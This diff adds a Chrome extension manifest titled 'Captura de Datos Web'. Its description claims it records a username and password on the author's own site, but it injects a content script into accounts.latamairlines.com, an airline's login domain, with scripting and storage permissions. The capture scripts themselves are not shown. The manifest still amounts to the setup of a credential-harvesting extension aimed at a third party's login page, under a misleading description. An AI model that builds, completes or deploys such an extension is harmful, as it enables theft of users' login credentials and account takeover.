@@ -1,0 +1,24 @@
+{
+  "manifest_version": 3,
+  "name": "Captura de Datos Web",
+  "version": "1.0",
+  "description": "Extensión para registrar usuario y contraseña en mi web.",
+  "permissions": ["storage", "scripting", "activeTab"],
+  "host_permissions": [
+    "https://accounts.latamairlines.com/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["https://accounts.latamairlines.com/*"],
+      "js": ["content.js"]
+    }
+  ],
+  "icons": {
+    "16": "icon.png",
+    "48": "icon.png",
+    "128": "icon.png"
+  }
+}
